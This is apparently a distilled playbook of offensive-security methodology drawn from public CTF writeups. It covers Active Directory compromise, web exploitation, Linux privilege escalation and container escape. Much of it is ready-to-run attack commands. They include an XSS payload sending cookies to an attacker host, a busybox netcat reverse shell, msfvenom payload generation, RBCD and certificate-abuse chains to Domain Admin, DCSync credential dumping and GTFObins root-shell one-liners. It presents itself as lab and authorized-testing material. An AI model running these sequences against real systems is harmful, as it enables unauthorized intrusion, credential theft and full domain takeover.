# 0xb0b Writeups — Extracted Methodology, Tool Knowledge & Vulnerability Patterns

> **Source attribution**: All patterns, tool habits, and chained attack sequences described below were extracted from the publicly available 0xb0b writeup repository (`https://0xb0b.gitbook.io/writeups`, CC BY 4.0). Specific writeups referenced in the analysis:
> - **Active Directory**: `Operation Endgame` (2026), `Ledger` (2025), `Forward` (2026), `Proxy` (2026), `Checkmate` (mentioned), `Manager` (HTB 2024)
> - **Linux privesc**: `Airplane` (2024), `Lookup` (2024), `Umbrella` (2024), `Soupedecode 01` (2025)
> - **Web exploitation**: `Sequence` (2025), `Profiles` (2024), `BoardLight` (HTB 2024), `Extract` (2025), `Lookup` (2024)
> - **Recon/forensics**: `Profiles` (memory forensics, 2024), `Operation Endgame` (full AD recon)
>
> This document distills the *author's methodology* (hypothesis chaining, dead-end handling, evidence-before-action discipline) rather than specific solutions. It is intended to support authorized security research and testing on systems the user explicitly owns or has written permission to assess.

---

## 1. The Author's Recurring Reasoning Loop

Every sampled writeup follows the same skeleton, even when the individual steps are different. The author does not jump from "I see a port" to "I have root"; they cascade observations into hypotheses, test them, and discard failures with explicit reasoning.

```
OBSERVATION         →  Nmap shows port 445 (SMB) on a Windows host
   │
HYPOTHESIS          →  "Empty-password guest account may be allowed"
   │
ENUMERATION         →  nxc smb <ip> -u guest -p ''  →  success
   │
HYPOTHESIS          →  "IPC$ readable means I can RID brute force for users"
   │
ENUMERATION         →  nxc smb <ip> -u guest -p '' --rid  →  user list
   │
DEAD-END CHECK     →  Try AS-REP roasting with username list  →  fail
   │
NEW HYPOTHESIS      →  "Kerberoasting works as guest because the service
                       ticket request doesn't validate Kerberos pre-auth
                       for low-priv accounts in some configurations"
   │
ENUMERATION         →  nxc ldap <ip> -u guest -p '' --kerberoasting
   │
EXPLOITATION        →  Crack TGS  →  valid account
   │
NEW HYPOTHESIS      →  "Cracked password may be reused across accounts
                       (credential pattern, not brute force)"
   │
ENUMERATION         →  Password spray cracked creds against user list
   │
PRIV ESC PATH      →  BloodHound shows GenericWrite → targeted Kerberoast
   │                    → crack TGS → gain access to JERRI_LANCASTER
   │                    → read C:\Scripts\syncer.ps1 → Domain Admin creds
   │
OBJECTIVE VALIDATION →  RDP in as Domain Admin, retrieve flag
```

The author **never** treats a successful single tool run as proof. They verify each step (`grep` for `SidTypeUser` after RID brute, `--show` after hashcat, login confirmation after each credential reveal). And they explicitly call out the dead ends ("we aren't able to crack them", "we seem to have reached a dead end here").

**Key habit**: every authentication test is followed by `--shares` to map immediate read access; every credential pair is fed into BloodHound/SharpHound before considering it dead; every "alternative path" is documented in the writeup (intentional or unintended) because the author recognizes that *unintended paths are real paths* in real engagements.

---

## 2. Active Directory Methodology (heavily sampled)

The AD writeups (`Operation Endgame`, `Ledger`, `Forward`, `Proxy`, `Manager`) are remarkably consistent in shape. The author treats the AD attack chain as a graph traversal problem, not a checklist.

### 2.1 The AD play (when starting with no creds)

1. **nmap/rustscan** for service fingerprinting. The author consistently runs a full TCP scan with `rustscan -b 500 -a <ip> --top -- -sC -sV -Pn` — `rustscan` is just a fast port-discovery front-end that pipes the open-port list into nmap for service/version detection. `-Pn` because THM/HTB boxes often don't respond to ICMP. The author then visually scans the open ports for the AD fingerprint: `53/88/135/139/389/445/464/593/636/3268/3269/3389/9389` and ephemeral high ports (`49664+`).

2. **Identify the role of the host.** The pattern of ports is diagnostic:
   - `88/464` + `389/636/3268/3269` + `445` + `3389` + `9389` → Domain Controller
   - `445` only with `139/135` → Member server
   - `5985` (WinRM HTTP) → modern Windows, prefer `evil-winrm`

3. **`/etc/hosts` immediately.** Add FQDN and shortname so Kerberos and SPN-based tools work. The author uses `nxc smb <ip> -u <user> -p <pw> --generate-hosts-file hosts` to extract the canonical host list.

4. **Try `guest:""` (empty password) first.** This is the single highest-yield opening move. Success gives:
   - Share enumeration: `nxc smb <ip> -u guest -p '' --shares`
   - RID brute: `nxc smb <ip> -u guest -p '' --rid` → user list
   - Anonymous LDAP: `ldapsearch -x -H ldap://<ip> -b "dc=<dom>,dc=<tld>"` (Ledger writeup caught user `description` fields containing literal password reminders: "Please change it: <PWD>")

5. **Anonymous LDAP is the gold mine.** The author reads `ldapsearch` output with `grep description` and other field filters looking for "leaked" text fields — server operators routinely put credentials or change-tickets in AD user descriptions, notes, and other free-text attributes.

6. **Username list → multiple attacks in parallel:**
   - AS-REP Roasting (`nxc ldap <ip> -u users.txt -p '' --asreproast out.txt` + `hashcat -a0 -m18200`)
   - Kerberoasting (`nxc ldap <ip> -u <user> -p <pw> --kerberoasting out.txt` + `hashcat -a0 -m13100`)
   - Password spray the cracked kerb password (with the user's own password) — the author repeatedly notes: "we'll try a password spray with the password of `<user>`, even though it doesn't look like it's being used by anyone else" → frequently succeeds because humans reuse passwords
   - Username-as-password (`nxc smb <ip> -u users.txt -p users.txt --no-brute --continue-on-success`)

### 2.2 Once inside — the trust graph

The author's central habit is to **load BloodHound after every successful credential pair**, then look for the shortest path to Domain Admins. The tool is treated as a hypothesis generator, not as a solution.

**BloodHound query patterns the author uses:**
- "Find Shortest Paths to Domain Admins" → reveals unintended privilege chains (e.g. `guest` group having GenericWrite on DC computer object)
- "Outbound Object Control" for the current user → see what the current user can manipulate
- Click on an edge → get the abuse instructions in BloodHound's "Help?" popover
- Right-click → "Abuse" tab in BloodHound CE

### 2.3 The escalation toolkit (in the order the author reaches for them)

| Technique | When used (in author's writeups) | Source |
|---|---|---|
| **Targeted Kerberoast** (`ShutdownRepo/targetedKerberoast`) | When `GenericWrite`/`GenericAll`/`Validated-SPN` is on a user | `Operation Endgame` |
| **Resource-Based Constrained Delegation (RBCD)** | When current user has `AddAllowedToAct` / `GenericWrite` on a computer object | `Forward`, `Ledger`, `Operation Endgame` (twice) |
| **S4U2Self + S4U2Proxy** via `getST.py` (Impacket) | When constrained delegation exists (with or without protocol transition) | `Proxy` (constrained delegation with protocol transition) |
| **Certipy ESC1** | When a CA template allows `EnrolleeSuppliesSubject` + client auth + low-priv enrollment | `Ledger` (ESC1) |
| **Certipy ESC7** | When a user has CA officer + template write | `Manager` (HTB) |
| **DCSync** (secretsdump) | When `Replicating Directory Changes` rights are held (DA, or via RBCD as shown) | `Forward`, `Proxy`, `Operation Endgame` |
| **Pass-the-Hash** with machine account NT hash | When an NT hash is dumped (e.g. from a share containing hashes, `Soupedecode 01`) | `Soupedecode 01` |
| **AS-REP Roasting** | When users have `DONT_REQ_PREAUTH` set | `Operation Endgame` (tried, failed) |
| **Kerbrute password spray** | Always after first crack | `Operation Endgame`, `Manager` |
| **Reading share files for literal creds** | Always — "dump" files, `Backup`, `Users\<user>\Desktop` | `Proxy` (IT-Credentials-Backup.txt), `Soupedecode 01` (Users share had a `users.txt`) |

### 2.4 RBCD attack chain (the author's most-cited escalation)

This sequence recurs in three different writeups (`Forward`, `Ledger`, `Operation Endgame`) almost verbatim. Memorize the shape:

```
1. Add machine account (default AD quota is 10/domain):
   impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$'
     -computer-pass '<chosen>' -dc-host <DC> -domain-netbios <DOMAIN>
     '<DOMAIN>/<user>:<password>'

2. Configure delegation on target computer:
   rbcd.py -dc-ip <ip> -delegate-from 'ATTACKERSYSTEM$'
     -delegate-to '<DC>$' -action 'write'
     '<DOMAIN>/<user>:<password>'
   # Or with empty password, use NT hash:
   # rbcd.py <DOM>/guest -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

3. Request service ticket as Administrator (S4U2Self+S4U2Proxy):
   getST.py -spn 'cifs/<DC>.fqdn' -impersonate 'Administrator'
     '<DOMAIN>/ATTACKERSYSTEM$:<chosen>'

4. Set ticket env var:
   export KRB5CCNAME=Administrator@cifs_<DC>.fqdn@<DOMAIN>.ccache

5. Use ticket to authenticate:
   smbclient.py -k -no-pass <DC>.fqdn -dc-ip <ip> -target-ip <ip>
   # Or for shell:
   smbexec.py -k -no-pass <DOM>/Administrator@<DC>.fqdn
   wmiexec.py -k -no-pass <DOM>/Administrator@<DC>.fqdn

6. From there: DCSync, dump NTDS, or simply read the flag.
```

### 2.5 Constrained Delegation (Proxy writeup pattern)

When the user has `AllowedToDelegate` to a service (here `cifs/DC01.ctf.local`), the chain is shorter:

```
getST.py ctf.local/svc.scanner:'<pw>' -spn cifs/DC01.ctf.local \
  -impersonate Administrator -dc-ip DC01.ctf.local
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
secretsdump.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

The key insight from the author: this user had **constrained delegation with protocol transition** — meaning they could request a service ticket for *any user* on that SPN without that user's TGT. Always check if protocol transition is set.

### 2.6 ESC1 (Certipy) — Ledger pattern

```
certipy-ad find -u <user>@<dom> -p '<pw>' -dc-ip <ip> -vulnerable
# Find: template that allows EnrolleeSuppliesSubject + Client Auth
#      + Enrollment Rights contains Authenticated Users / Domain Computers
# Get a cert with arbitrary UPN:
certipy-ad req -username <user> -password '<pw>' \
  -ca <CA-name> -target <CA-host>.<dom> \
  -template <vulnerable-template> -upn <target-user>@<dom>
# Authenticate with the cert to get NT hash:
certipy-ad auth -pfx <target-user>_*.pfx -dc-ip <ip>
# Now pass-the-hash as the target user:
impacket-wmiexec -hashes :<nt-hash> <DOM>/<target-user>@<host>.<dom>
```

### 2.7 ESC7 (Certipy) — Manager HTB pattern

When the user has the **CA officer** role and a write-enabled template (e.g. `SubCA`):

```bash
# In rapid succession (commands must be issued before the request times out):
certipy ca -ca '<CA>' -add-officer <user> -username <u> -password <p>
certipy ca -ca '<CA>' -enable-template SubCA -username <u> -password <p>
certipy req -username <u> -password <p> -ca '<CA>' -target '<dom>' \
  -template SubCA -upn administrator@<dom>
# Note the request_id from the response, then:
certipy ca -ca '<CA>' -issue-request <request_id> -username <u> -password <p>
certipy req -username <u> -password <p> -ca '<CA>' -target '<dom>' -retrieve <request_id>
# Get the hash:
sudo ntpdate -s <dom> && certipy auth -pfx administrator.pfx
```

The author script-wraps the whole sequence to handle the timing constraint.

### 2.8 ADCS common misconfigurations to enumerate

| ESC | Conditions | Tool output |
|---|---|---|
| ESC1 | EnrolleeSuppliesSubject + Client Auth + low-priv Enrollment | `certipy find -vulnerable` |
| ESC2 | Any Purpose EKU + low-priv Enrollment | `certipy find` |
| ESC3 | Enrollment Agent template + low-priv enrollment | `certipy find` |
| ESC4 | Write access to template | `certipy find` |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set on CA | `certipy find` |
| ESC7 | CA officer + Manage CA + Manage Certificates rights | `certipy find` + check user's CA ACE |
| ESC8 | HTTP web enrollment + NTLM relay possible | `certipy find` |
| ESC9 | No security extension + template has any purpose | `certipy find` (newer) |
| ESC11 | `IF_ENFORCEENCRYPTICERTREQUEST` not set + ESC1-like | `certipy find` |
| ESC13 | Issuance policy + low-priv group linked to privileged group | `certipy find` |
| ESC14 | Weak explicit mapping of certificate to account | `certipy find` |
| ESC15 | `msPKI-Name-` flags misuse (EKUwu policy) | `certipy find` |

### 2.9 The "unintended" path pattern

In multiple writeups (`Operation Endgame`, `Ledger`) the author documents BOTH the intended and unintended paths. The unintended path is usually:
- A misconfigured ACL that gives `Authenticated Users` / `Domain Computers` / `Guests` GenericWrite on a computer object
- This enables RBCD with no prerequisites

This is critical: **in real engagements, intended vs. unintended doesn't matter** — the author notes the unintended path because it works. Testers should look for these "everyone has write" edges in BloodHound on every engagement.

---

## 3. Web Application Methodology (sampled from Sequence, Profiles, BoardLight, Extract, Lookup)

### 3.1 The web attack chain

The author treats every web target as a series of small experiments, each producing a single binary signal: success or fail.

1. **Manual browse first** (curl/headless) — understand the application shape
2. **Directory bust** (Feroxbuster preferred, then Gobuster, then ffuf for wordlist-fuzz)
3. **Subdomain bust** (if FQDN is known) — `ffuf -w subdomains.txt -u http://<base>/ -H "Host: FUZZ.<base>" -fw <size>`
4. **Inspect source** — every page source is read; comments, hidden fields, debug output, hints
5. **Function-by-function testing** — login, contact form, file upload, search, password reset, etc.
6. **Each finding chained** — e.g. leaked page name in source → new path → new functionality → new attack

### 3.2 Web vulnerability patterns (sampled from these writeups)

#### 3.2.1 Broken authentication / credential stuffing (Lookup)

The author uses a multi-stage ffuf approach:
1. **Confirm a user exists** by response size difference: `ffuf -w bypass.txt -X POST -u http://target/login.php -d 'username=FUZZ&password=asdf' -fw 10` — most users get same size, but `admin` returns a different size.
2. **Fuzz password for that user**: `ffuf -w <passwords.txt> -X POST -u http://target/login.php -d 'username=admin&password=FUZZ' -fw <known-bad-size>` — different size again = valid password.
3. **Fuzz username with found password**: `ffuf -w usernames.txt -X POST -u http://target/login.php -d 'username=FUZZ&password=<known-pw>' -fw <known-bad-size>` — 302 redirect = different valid user with same password.
4. **Result**: discovered `jose:<password>` for `lookup.thm`.

The lesson: **use response size and status code as the only signal, not error messages**.

#### 3.2.2 SSRF (Extract)

The author walks through:

- **Detection**: `?url=http://<attacker-IP>` reaches attacker → confirms SSRF
- **Internal port scan via SSRF**: `ffuf -w ports.txt -u 'http://target/preview.php?url=127.0.0.1:FUZZ' -fw 1` (filter on "Page not found" or 200 size) → finds internal services
- **Reading internal services**: `?url=127.0.0.1:10000` (NextJS API on alternate port)
- **CVE-2025-29927**: NextJS middleware auth bypass via `x-middleware-subrequest: middleware` header
- **Gopher for protocol smuggling**: since SSRF only does GET, use `gopher://127.0.0.1:10000/_<raw HTTP request>` to perform arbitrary HTTP methods with custom headers
- **Encoding scheme**: double-URL-encode the spaces (`%2520`), single-encode `/` (`%2f`), single-encode newlines (`%250d%250a`)
- **Cookie-based 2FA bypass via PHP deserialization**: the `auth_token` cookie is a PHP serialized object (`O:9:"AuthToken":1:{s:9:"validated";b:1;}`) → flip `b:0` to `b:1` → bypass 2FA

The lesson: **when a GET-only SSRF is present, look for ways to upgrade it to arbitrary HTTP requests** (gopher, LDAP, dict). And **always check response cookies for deserialization candidates** (PHP `O:`, Python pickle markers, Java `rO0AB`).

#### 3.2.3 LFI (Airplane)

- **Confirm**: `?page=./../../../../etc/passwd` returns file contents
- **Gather identity**: `?page=./../../../../proc/self/environ` → reveals process env (logged-in user, `HOME`, `PATH`)
- **Enumerate siblings via /proc**: `?page=./../../../../proc/<pid>/cmdline` for each PID — author wrote a custom Python script to iterate PIDs 1-1000, find processes, identify what was running
- **Found `gdbserver 0.0.0.0:6048`** — open gdbserver = unauthenticated RCE
- **Exploit**: use msfvenom reverse shell + `gdb binary.elf` + `target extended-remote <ip>:6048` + `remote put binary.elf /home/<user>/binary.elf` + `set remote exec-file /home/<user>/binary.elf` + `run`

The lesson: **`/proc` is a remote-fs-friendly oracle** — when you can include `/proc/<pid>/cmdline`, you can enumerate every running process. Process list reveals: gdbserver, debug builds, internal services on unexposed ports, command-line secrets, etc.

#### 3.2.4 File upload + RCE (Sequence, BoardLight)

**Dolibarr 17.0.0 (BoardLight)** — uppercase tag bypass:
- Default creds `admin:admin` log into Dolibarr
- Create a website page in the Websites module
- Use `Edit HTML Source` and put `<?PHP echo system("whoami"); ?>` — the filter only blocks lowercase `<?php` and `<?=`
- Use `busybox nc <attacker> <port> -e /bin/bash` for reverse shell

**elFinder 2.1.47 (Lookup)** — command injection in filename:
- Exploit-db 46481: command injection in PHP connector's `connect.minimal.php`
- Run with `python2.7 elfinder.py http://target/elFinder/` (works without auth in this case)
- Generated PHP web shell into upload dir

The lesson: **filter bypasses are common in CMS-style apps** — `<?PHP`, `<script language=php>`, base64-encoded tags, phtml extensions. Always test both the extension and the content filter.

#### 3.2.5 XSS → session hijack → privilege escalation (Sequence)

- Contact form has `name`, `phone`, `message` fields — all XSS-vulnerable
- Payload: `<img src=x onerror="this.src='http://<attacker>/?c='+document.cookie"/>`
- The mod account reviews the form → cookie sent to attacker
- Set `PHPSESSID` to stolen value → impersonate mod
- Mod has "promote to admin" feature → use it
- CSRF token is the **MD5 of the username** (predictable) → use `csrf_token_promote=<md5("admin")>` to promote mod to admin
- New mod-with-admin dashboard has file upload → reverse shell

The lesson: **XSS in a low-priv account is a privilege escalation vector when the app has a "review by admin" workflow**. And **CSRF tokens that are derived from known values (username, timestamp) are not secure** even if they look random.

#### 3.2.6 HTTP parameter pollution, weak password storage, multiple-step auth bypass

The author probes for:
- HTTP Parameter Pollution: sending the same param twice with different values
- Login bypass via SQL: `admin'--`, `' OR 1=1--`, etc. (HackTricks' SQL-login-bypass cheatsheet)
- Error-based SQLi: intentionally trigger errors to leak schema
- Boolean-based blind: different response sizes for true vs. false conditions
- Forgot-password flows for enumeration

### 3.3 Container escape (Sequence, Umbrella)

The author handles Docker escapes methodically:

**Sequence pattern — privileged Docker socket + mounted /proc:**
- `docker ps` inside container works → full Docker access
- `docker run -it --rm -v /:/host <image> /bin/sh` → mount host root → read host `/root/flag.txt`

**Umbrella pattern — host folder mounted into container:**
- Container is root in the container, host folder `/logs` is mounted
- `cp /bin/bash <mounted-host-dir>/bash` (host binary, not container binary)
- Inside container: `chown root:root <mounted-host-dir>/bash; chmod 4777`
- On host: `/bin/bash -p` → effective root (SUID preserved)

The lesson: **if a folder is shared between container and host, you can drop a SUID binary from the container (where you're root) to the host (where you're not)**. This is a classic HackTricks trick the author uses directly.

### 3.4 WAF bypass and RCE (Padelify, Hammer, Decryptify)

The author approaches WAF-bypass by trying:
1. Different cases (`<script>` vs `<ScRiPt>`)
2. URL encoding, double-encoding
3. UTF-8/UTF-16/UTF-32 encoding
4. Comment injection in middle of tags: `<scr<!-- -->ipt>`
5. Alternative tags/attributes (`onload`, `onfocus`, `onerror`, `autofocus onfocus=`)
6. Body + onclick for HTML injection
7. Polyglot payloads

---

## 4. Linux Privilege Escalation Methodology (Airplane, Lookup, Umbrella, Soupedecode 01)

### 4.1 The Linux privesc loop

```
1. Initial shell (www-data / svc / app user)
2. Run LinPEAS / linenum / manual enum:
   - id, whoami, uname -a, sudo -l
   - ls -la /home/*, /opt, /srv, /var/www
   - find / -perm -4000 2>/dev/null  (SUID)
   - find / -writable -type d 2>/dev/null
   - find / -name "*.conf" -readable 2>/dev/null
   - /etc/passwd (find users with bash shell)
   - crontab -l, /etc/cron*, systemd timers
   - ip a, ip route, ss -tlnp (network)
   - env, /proc/self/environ
3. Hypothesis: "this SUID binary uses a relative path for `id`, so PATH manipulation works"
4. Validation: download binary, strings, check for calls to env-only binaries
5. Exploitation: `echo '#!/bin/bash\necho "uid=1000(think)..."\nchmod +x /tmp/id; export PATH=/tmp:$PATH; /usr/sbin/pwm`
6. New identity
7. Repeat from step 2 as the new user
```

### 4.2 SUID privesc — the author's pattern (Lookup, Airplane)

The author uses **GTFObins** as a reference, but the *real* work is in identifying the binary as interesting:

**Signals that a SUID binary is exploitable:**
- Owned by a different user (especially root)
- Calls other binaries with relative paths (not `/usr/bin/...`)
- SUID binary not in standard package set (e.g. custom `/usr/sbin/pwm`)
- Has known CVEs (Airplane: `/usr/bin/find` SUID → GTFObins has `find . -exec /bin/sh -p \; -quit`)

**Path hijack (Lookup writeup):**
1. `strings /usr/sbin/pwm` → see "id" reference
2. `BinaryNinja` analysis → confirms `id` is called without full path
3. `echo '#!/bin/bash\necho "uid=1000(think)..."' > /tmp/id; chmod +x /tmp/id`
4. `export PATH=/tmp:$PATH; /usr/sbin/pwm` → now reads `think`'s `.passwords` file
5. Try the password against SSH, or `su think`

**`sudo -l` abuse (Lookup):**
- `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/look`
- `look` reads files (GTFObins: `LFILE=/root/.ssh/id_rsa; sudo look '' "$LFILE"`)
- Read root's SSH key → log in as root

**Wildcard sudo (Airplane):**
- `(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb`
- The wildcard means `ruby` evaluates anything ending in `.rb` — including `/root/../home/carlos/evil.rb`
- `echo 'system("/bin/bash")' > /home/carlos/evil.rb; sudo /usr/bin/ruby /root/../home/carlos/evil.rb`

### 4.3 Sudo GTFObins — common vectors the author uses

| Binary | Privesc command | Note |
|---|---|---|
| `find` | `find . -exec /bin/sh -p \; -quit` | SUID variant |
| `look` | `sudo look '' "/root/.ssh/id_rsa"` | Reads arbitrary files |
| `ruby` | `sudo ruby -e 'exec "/bin/bash"'` | Direct shell |
| `python` | `sudo python -c 'import os; os.system("/bin/bash")'` | Direct shell |
| `vim` | `sudo vim -c ':!/bin/bash'` | Editor escape |
| `less`/`more` | `sudo less /etc/profile` then `!/bin/bash` | Pager escape |
| `awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` | Direct |
| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` | Action exec |
| `zip` | `sudo zip /tmp/x.zip /etc/hosts -T --unzip-command="sh -c /bin/bash"` | Unzip exec |
| `strace` | `sudo strace -o /dev/null /bin/bash` | Trace and exec |
| `nmap` (older) | `nmap --interactive` then `!sh` | Old nmap only |
| `openssl` | `sudo openssl enc -in /etc/shadow` | Read encrypted |
| `mysql` | `sudo mysql -e '\! /bin/bash'` | Shell escape |

### 4.4 Container privesc (Umbrella, Sequence)

- Check for mounted host directories: `mount | grep host`
- Look for `.dockerenv` to confirm container
- Check if `docker` is callable from inside (Sequence: full Docker access)
- Check for mounted `/.dockerenv`, `/proc`, host paths

---

## 5. Recon / Enumeration Methodology

### 5.1 The recon loop the author uses

```
1. Service discovery:
   rustscan -b 500 -a <ip> --top -- -sC -sV -Pn
   # Or pure nmap:
   nmap -p- <ip> -T4
   nmap -sC -sV -p <ports> <ip>

2. Service identification — what is this host?
   - Port 88/389/445/636/3268/3269 → AD DC
   - Port 80/443 + headers → web framework
   - 22 + version → SSH version (look for known vulns)
   - 445 alone → standalone Windows
   - 21 → FTP anonymous check
   - 25 → SMTP VRFY / user enum
   - 161 → SNMP community strings
   - 3306 → MySQL
   - 1433 → MSSQL
   - 5000 → Docker registry (Umbrella)

3. Naming:
   - Add FQDN and shortname to /etc/hosts
   - Note the domain from LDAP/NTLM/Nmap scripts

4. Anonymous/guest access check (always first on SMB, FTP, Redis, MongoDB):
   nxc smb <ip> -u guest -p '' --shares
   nxc smb <ip> -u anonymous -p '' --shares
   ftp <ip> # try anonymous:anonymous
   smbclient -L //<ip>/ -N

5. Web enumeration if applicable:
   feroxbuster -w <wordlist> -u http://target/
   ffuf -w subdomains.txt -u http://<base>/ -H "Host: FUZZ.<base>"
   Manual browse + view source

6. Default credentials check (per-service):
   - admin:admin (most CMS)
   - admin:password
   - service-specific (msfvenom has a default-creds list)
```

### 5.2 The author's specific tools and their role

| Tool | Purpose | Notes from author |
|---|---|---|
| **rustscan** | Fast TCP port discovery | `rustscan -b 500 -a <ip> --top -- -sC -sV -Pn` — pipes into nmap |
| **nmap** | Service/version detection, NSE scripts | Always `-sC -sV -Pn` on discovered ports; manually pick scripts |
| **Feroxbuster** | Directory/file busting (recursive) | Author's default for web recon |
| **Gobuster** | Directory busting (non-recursive) | Used as fallback |
| **ffuf** | Parameter/header/subdomain fuzzing | For fine-grained fuzzing, response size/status code as signal |
| **Burp Suite** | HTTP interception, modification, replay | Used for cookie inspection, header manipulation, request crafting |
| **NetExec (nxc)** | SMB/LDAP/WinRM/MSSQL/SSH enumeration | Author's replacement for CrackMapExec — single tool, many protocols |
| **hydra** | Online password brute force | `hydra -l <user> -P <wordlist> <protocol>://<ip>` |
| **Impacket** | Protocol-level AD attacks | `psexec.py`, `wmiexec.py`, `smbexec.py`, `secretsdump.py`, `GetUserSPNs.py`, `addcomputer.py`, `rbcd.py`, `getST.py`, `ticketer.py`, `mssqlclient.py` |
| **Certipy** | ADCS enumeration and exploitation | `certipy find -vulnerable`, ESC1-ESC15 attacks |
| **targetedKerberoast** (ShutdownRepo) | Targeted Kerberoast with GenericWrite | `targetedKerberoast.py -d <dom> -u <user> -p <pw> --request-user <target>` |
| **BloodHound / SharpHound / bloodhound-ce.py** | AD attack path visualization | `bloodhound-ce.py --zip -c All -d <dom> -u <user> -p <pw> -dc <dc> -ns <ip>` |
| **Kerbrute** | Username enumeration + password spray | `./kerbrute userenum -d <dom> <users.txt> --dc <dc>` |
| **bloodyAD** | AD modification via Kerberos | `bloodyAD -d <dom> -k --host <dc> add groupMember "Domain Admins" <user>` |
| **LaZagne** | Windows credential extraction (browser, mail, KeePass, Wi-Fi) | `lazagne` then look at output |
| **evil-winrm** | WinRM shell | `evil-winrm -i <ip> -u <user> -p <pw>` |
| **remmina** | RDP client (Linux) | Used for GUI-based Windows access |
| **LinPEAS** | Linux privesc enumeration | Upload via web server, execute, read color-coded output |
| **msfvenom** | Payload generation | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=... LPORT=... -f elf -o binary.elf` |
| **nc / ncat** | Reverse shell listener, banner grabbing | `nc -lnvp <port>` |
| **curl** | HTTP testing, SSRF testing, API enumeration | `curl -v`, `curl -X POST -d '...'`, `curl -H 'Cookie: ...' ...` |
| **ssh** | Remote access | `ssh -i <key> <user>@<ip>` |
| **openvpn** | VPN connection (THM, HTB, Pivoting) | `openvpn <user>.ovpn` |
| **stty / script / python3 -c 'import pty; pty.spawn(...)'** | Shell upgrade | The author's exact upgrade sequence (see below) |
| **smbclient.py / smbclient** | SMB interaction | `smbclient //ip/share -U user%pass` or `smbclient.py -k -no-pass` |
| **ntlm_theft.py** (Greenwolf) | Generate files that leak NTLM via SMB/HTTP | `ntlm_theft.py --generate modern --server <ip> --filename 'note'` |
| **responder / impacket-smbserver** | Capture NTLMv2 hashes | `smbserver.py -smb2support EXEGOL $(pwd)` |
| **gdb** | Debug, but also gdbserver client | `target extended-remote <ip>:6048; remote put ...; set remote exec-file ...; run` |
| **crackstation.net / hashcat** | Offline hash cracking | `hashcat -a0 -m <type> <hash> <wordlist> --show` |
| **revshell.com** | Reverse shell payload reference | `nc mkfifo`, `bash -i`, `perl`, `python` payloads |
| **GTFObins** | Unix binary privilege escalation | Author cites it directly for `look`, `find`, `ruby` |
| **HackTricks** | Encyclopedia of techniques | Cited for SSRF, gopher, Docker escape, SQL bypass, etc. |
| **Penelope** | Reverse shell handler with auto-upgrade | Used as alternative to manual `stty` upgrade |

### 5.3 The shell upgrade sequence the author uses

```bash
# Catch reverse shell
nc -lnvp 4444

# After getting a basic shell, upgrade to TTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or python -c '...'

# Ctrl+Z to background the nc
# Get terminal size:
stty rows 40 cols 160   # or whatever
# Set raw mode:
stty raw -echo; fg
# Now we have a proper TTY with command history (up arrow works)
```

### 5.4 Common wordlists the author uses

- `/usr/share/wordlists/rockyou.txt` — for password cracking (hashcat)
- `/usr/share/wordlists/SecLists/Passwords/2020-200_most_used_passwords.txt` — for online brute
- `/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt` — for username enum
- `/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt` — for Feroxbuster
- `/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt` — for subdomain fuzz
- `/usr/share/wordlists/dirb/big.txt` — for Gobuster fallback

### 5.5 When nmap ports look like an AD DC

The author uses the port fingerprint to identify roles and acts on it:

| Port signature | Identified role | First move |
|---|---|---|
| 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 9389 | **Domain Controller** | Add to /etc/hosts, try guest:"" on SMB |
| 80, 443 with Microsoft-IIS header | **IIS web server** | Read TLS cert for CA name; view source |
| 5985 (WinRM HTTP) | **Modern Windows** | Use evil-winrm for shell |
| 1433 | **MSSQL** | `mssqlclient.py <dom>/<user>:<pw>@<ip> -windows-auth` |
| 22 only | **Linux/Unix** | Try SSH creds; check web on adjacent ports |
| 8000 with Werkzeug header | **Python/Flask** | Look for debug endpoints, source disclosure |
| 5000 | **Docker registry** | `curl http://<ip>:5000/v2/_catalog` |
| 8080 with Node.js | **Node.js app** | Inspect for eval() calls, deserialization |

### 5.6 For Linux memory forensics (Profiles writeup)

- Use Volatility 2 with a custom-built profile (or Volatility 3 with `dwarf2json` for newer images)
- Key plugins: `linux_bash`, `linux_enumerate_files`, `linux_find_file`, `linux_netstat`, `linux_lsof`
- Process: create a profile → run `banners` to confirm kernel → run `linux_bash` to recover shell history → find malicious binaries → `linux_find_file -i <inode> -O <output>` → `md5sum` → correlate with `linux_netstat` for C2 IPs

---

## 6. VPN / Pivoting (per the original prompt's interest)

The author connects via OpenVPN (`openvpn <user>.ovpn`), checks for a new `tun0`/`wg0` interface, and routes all traffic to the lab. Pivoting via chisel / ligolo / sshuttle appears less frequently in the sampled writeups (more common in HTB-style chains), but the pattern is:
- Identify an internal network on a compromised host (e.g. `192.168.x.x` route)
- Set up a SOCKS proxy via SSH: `ssh -D 1080 <user>@<jump>`
- Or `chisel server --reverse` + `chisel client <jump>:8080 R:socks`
- Or `socat` to forward specific ports
- Proxychains around the new internal services

---

## 7. Vulnerability Pattern Catalog (recurring across the writeups)

### 7.1 Exposed services
- Docker registry on port 5000 (Umbrella) — pulls leak DB passwords in image history
- gdbserver on non-default port (Airplane) — full RCE
- SMB on every host — guest:"" is the first thing to try
- NextJS / Node.js on port 10000 (Extract) — CVE-2025-29927 auth bypass
- Werkzeug debug pin endpoints (Airplane) — but in this case no debug pin, just LFI

### 7.2 Weak / default credentials
- `admin:admin` on Dolibarr 17.0.0 (BoardLight)
- `guest:""` on multiple Windows hosts (Operation Endgame, Ledger, Soupedecode 01, Proxy)
- `operator:operator` on MSSQL via username-as-password (Manager HTB)
- `claire-r:<cracked-MD5>` on multiple internal services (Umbrella)
- Reused `CODY_ROY` password across `ZACHARY_HUNT` (Operation Endgame) — credential reuse

### 7.3 Command injection
- elFinder 2.1.47 (Lookup)
